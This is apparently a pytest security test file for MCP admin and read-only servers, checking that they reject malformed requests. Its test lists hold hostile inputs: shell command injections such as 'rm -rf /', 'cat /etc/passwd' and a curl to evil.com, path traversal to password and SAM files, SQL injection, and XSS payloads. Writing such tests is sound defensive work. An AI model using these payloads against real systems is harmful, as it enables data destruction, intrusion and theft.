"""
Security tests for malformed command handling.

Tests that MCP servers properly handle malformed, invalid, and malicious commands.
"""
import pytest
import httpx
from unittest.mock import patch, Mock
from src.logic.mcp.core.admin_server import McpAdminServer
from src.logic.mcp.core.read_only_server import McpReadOnlyServer


class TestMcpMalformedCommands:
    """Test handling of malformed and malicious commands."""

    @pytest.fixture
    def admin_server(self):
        """Create admin server instance."""
        return McpAdminServer()

    @pytest.fixture
    def read_only_server(self):
        """Create read-only server instance."""
        return McpReadOnlyServer()

    @pytest.mark.asyncio
    async def test_malformed_json_request(self, admin_server):
        """Test handling of malformed JSON requests."""
        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            # Send malformed JSON
            response = await client.post(
                "/mcp/v1/execute_command",
                content="{ invalid json syntax }"
            )

            assert response.status_code == 422  # Unprocessable Entity
            error_data = response.json()
            assert "error" in error_data or "detail" in error_data

    @pytest.mark.asyncio
    async def test_missing_required_fields(self, admin_server):
        """Test handling of requests with missing required fields."""
        test_cases = [
            {},  # Empty request
            {"method": "execute_command"},  # Missing params
            {"params": {"command": "health"}},  # Missing method
            {"method": "execute_command", "params": {}},  # Missing command in params
        ]

        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            for test_case in test_cases:
                response = await client.post(
                    "/mcp/v1/execute_command",
                    json=test_case
                )

                assert response.status_code in [400, 422], f"Failed for test case: {test_case}"
                error_data = response.json()
                assert "error" in error_data or "detail" in error_data

    @pytest.mark.asyncio
    async def test_invalid_method_names(self, admin_server):
        """Test handling of invalid MCP method names."""
        invalid_methods = [
            "invalid_method",
            "execute_malicious_code",
            "../../../etc/passwd",
            "'; DROP TABLE projects; --",
            "<script>alert('xss')</script>",
            "eval(malicious_code)",
            None,
            123,
            []
        ]

        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            for invalid_method in invalid_methods:
                response = await client.post(
                    "/mcp/v1/execute_command",
                    json={
                        "method": invalid_method,
                        "params": {"command": "health", "arguments": []}
                    }
                )

                assert response.status_code in [400, 422, 404], f"Failed for method: {invalid_method}"

    @pytest.mark.asyncio
    async def test_command_injection_attempts(self, admin_server):
        """Test protection against command injection attempts."""
        injection_attempts = [
            {"command": "health", "arguments": ["; rm -rf /"]},
            {"command": "project", "arguments": ["--list", "&& cat /etc/passwd"]},
            {"command": "crawl", "arguments": ["test", "| curl http://evil.com"]},
            {"command": "health", "arguments": ["`id`"]},
            {"command": "setup", "arguments": ["$(whoami)"]},
            {"command": "health", "arguments": ["'; DROP TABLE users; --"]},
        ]

        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            for injection in injection_attempts:
                with patch('src.logic.mcp.services.admin.AdminMcpService.execute_command') as mock_execute:
                    mock_execute.return_value = {
                        "success": False,
                        "error": "Command rejected for security reasons"
                    }

                    response = await client.post(
                        "/mcp/v1/execute_command",
                        json={
                            "method": "execute_command",
                            "params": injection
                        }
                    )

                    # Should either reject the request or sanitize it
                    assert response.status_code in [200, 400, 403, 422]

                    if response.status_code == 200:
                        data = response.json()
                        if data.get("success") is False:
                            assert "security" in data.get("error", "").lower()

    @pytest.mark.asyncio
    async def test_path_traversal_attempts(self, read_only_server):
        """Test protection against path traversal attempts."""
        traversal_attempts = [
            {"project_name": "../../../etc", "file_path": "passwd"},
            {"project_name": "test", "file_path": "../../../etc/passwd"},
            {"project_name": "test", "file_path": "..\\..\\..\\windows\\system32\\config\\sam"},
            {"project_name": "test", "file_path": "/etc/passwd"},
            {"project_name": "test", "file_path": "\\etc\\passwd"},
            {"project_name": "test", "file_path": "....//....//....//etc/passwd"},
        ]

        async with httpx.AsyncClient(app=read_only_server.app, base_url="http://localhost:9383") as client:
            for traversal in traversal_attempts:
                response = await client.post(
                    "/mcp/v1/get_project_files",
                    json={
                        "method": "get_project_files",
                        "params": traversal
                    }
                )

                # Should reject path traversal attempts
                assert response.status_code in [400, 403, 404, 422]

    @pytest.mark.asyncio
    async def test_oversized_request_handling(self, admin_server):
        """Test handling of oversized requests."""
        # Create a very large argument list
        huge_arguments = ["arg"] * 10000

        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            response = await client.post(
                "/mcp/v1/execute_command",
                json={
                    "method": "execute_command",
                    "params": {
                        "command": "health",
                        "arguments": huge_arguments
                    }
                }
            )

            # Should reject oversized requests
            assert response.status_code in [400, 413, 422]  # Bad Request, Payload Too Large, or Unprocessable

    @pytest.mark.asyncio
    async def test_invalid_data_types(self, admin_server):
        """Test handling of invalid data types in requests."""
        invalid_type_tests = [
            {"method": 123, "params": {}},  # Number as method
            {"method": [], "params": {}},  # Array as method
            {"method": "execute_command", "params": "not_an_object"},  # String as params
            {"method": "execute_command", "params": {"command": [], "arguments": "not_array"}},
            {"method": "execute_command", "params": {"command": None, "arguments": []}},
        ]

        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            for invalid_test in invalid_type_tests:
                response = await client.post(
                    "/mcp/v1/execute_command",
                    json=invalid_test
                )

                assert response.status_code in [400, 422], f"Failed for test: {invalid_test}"

    @pytest.mark.asyncio
    async def test_unicode_and_encoding_attacks(self, read_only_server):
        """Test handling of unicode and encoding-based attacks."""
        unicode_attacks = [
            {"project_name": "test\x00", "file_path": "test.txt"},  # Null byte injection
            {"project_name": "test", "file_path": "test\x00.txt"},
            {"project_name": "test\u202e", "file_path": "test.txt"},  # Right-to-left override
            {"project_name": "test", "file_path": "test\u200b.txt"},  # Zero-width space
            {"project_name": "test", "file_path": "test\ufeff.txt"},  # Byte order mark
        ]

        async with httpx.AsyncClient(app=read_only_server.app, base_url="http://localhost:9383") as client:
            for attack in unicode_attacks:
                response = await client.post(
                    "/mcp/v1/get_project_files",
                    json={
                        "method": "get_project_files",
                        "params": attack
                    }
                )

                # Should handle unicode safely
                assert response.status_code in [200, 400, 404, 422]

    @pytest.mark.asyncio
    async def test_sql_injection_attempts(self, read_only_server):
        """Test protection against SQL injection attempts in search queries."""
        sql_injection_tests = [
            "'; DROP TABLE projects; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "admin'; DELETE FROM projects WHERE '1'='1",
            "test' OR 1=1; --",
            "'; EXEC sp_executesql N'DROP TABLE projects'; --",
        ]

        async with httpx.AsyncClient(app=read_only_server.app, base_url="http://localhost:9383") as client:
            for injection in sql_injection_tests:
                response = await client.post(
                    "/mcp/v1/search_projects",
                    json={
                        "method": "search_projects",
                        "params": {"query": injection}
                    }
                )

                # Should handle safely without executing SQL
                assert response.status_code in [200, 400, 422]

                if response.status_code == 200:
                    data = response.json()
                    # Should not return inappropriate data or errors
                    assert data.get("success") is not False or "sql" not in data.get("error", "").lower()

    @pytest.mark.asyncio
    async def test_xss_prevention(self, read_only_server):
        """Test prevention of XSS attacks in responses."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<svg onload=alert('xss')>",
            "');alert('xss');//",
        ]

        async with httpx.AsyncClient(app=read_only_server.app, base_url="http://localhost:9383") as client:
            for payload in xss_payloads:
                response = await client.post(
                    "/mcp/v1/search_projects",
                    json={
                        "method": "search_projects",
                        "params": {"query": payload}
                    }
                )

                assert response.status_code in [200, 400, 422]

                if response.status_code == 200:
                    response_text = response.text
                    # Should not contain unescaped script tags or javascript: URLs
                    assert "<script>" not in response_text.lower()
                    assert "javascript:" not in response_text.lower()

    @pytest.mark.asyncio
    async def test_denial_of_service_protection(self, admin_server):
        """Test protection against denial of service attacks."""
        # Test rapid successive requests
        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            # Send multiple requests rapidly
            tasks = []
            for i in range(50):
                task = client.post(
                    "/mcp/v1/execute_command",
                    json={
                        "method": "execute_command",
                        "params": {"command": "health", "arguments": []}
                    }
                )
                tasks.append(task)

            # Should handle without crashing
            responses = []
            for task in tasks:
                try:
                    response = await task
                    responses.append(response)
                except Exception:
                    # Rate limiting or connection limits may cause some to fail
                    pass

            # At least some requests should succeed
            successful_responses = [r for r in responses if r.status_code == 200]
            assert len(successful_responses) > 0, "All requests failed - server may have crashed"

    @pytest.mark.asyncio
    async def test_invalid_timeout_values(self, admin_server):
        """Test handling of invalid timeout values."""
        invalid_timeouts = [
            -1,  # Negative timeout
            0,   # Zero timeout
            999999,  # Extremely large timeout
            "invalid",  # String timeout
            [],  # Array timeout
            None  # Null timeout
        ]

        async with httpx.AsyncClient(app=admin_server.app, base_url="http://127.0.0.1:9384") as client:
            for timeout in invalid_timeouts:
                response = await client.post(
                    "/mcp/v1/execute_command",
                    json={
                        "method": "execute_command",
                        "params": {
                            "command": "health",
                            "arguments": [],
                            "timeout": timeout
                        }
                    }
                )

                # Should either reject invalid timeouts or use safe defaults
                assert response.status_code in [200, 400, 422]

    def test_input_sanitization(self):
        """Test that input sanitization functions work correctly."""
        from src.logic.mcp.utils.security import sanitize_command_argument, is_safe_file_path

        # Test command argument sanitization
        dangerous_args = [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| curl http://evil.com",
            "`id`",
            "$(whoami)",
            "''; DROP TABLE users; --"
        ]

        for arg in dangerous_args:
            sanitized = sanitize_command_argument(arg)
            # Should remove or escape dangerous characters
            dangerous_chars = [";", "&", "|", "`", "$"]
            for char in dangerous_chars:
                assert char not in sanitized or sanitized.count(char) < arg.count(char)

        # Test file path safety
        unsafe_paths = [
            "../../../etc/passwd",
            "/etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//etc/passwd"
        ]

        for path in unsafe_paths:
            assert not is_safe_file_path(path), f"Unsafe path was considered safe: {path}"

        # Test safe paths
        safe_paths = [
            "file.txt",
            "subdir/file.txt",
            "project/docs/readme.md"
        ]

        for path in safe_paths:
            assert is_safe_file_path(path), f"Safe path was considered unsafe: {path}"